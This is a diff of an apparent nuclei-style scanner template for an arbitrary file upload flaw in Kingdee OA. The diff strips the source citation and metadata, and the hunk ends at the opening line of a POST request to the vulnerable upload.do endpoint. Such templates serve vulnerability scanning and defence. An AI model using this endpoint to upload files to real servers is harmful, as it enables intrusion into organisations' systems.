@@ -3,12 +3,8 @@ info:
   name: ⾦蝶OA KingdeeOA PostilUpload 任意⽂件上传
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/rikclo4smra6teyw'
+  description: ''
   tags: file-upload,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: rikclo4smra6teyw
-    fofa: ⾦蝶OA_V7.0
 http:
 - raw:
   - 'POST /KingdeeOA/upload.do?m=officeUpload&id=1&uuid=2 HTTP/1.1
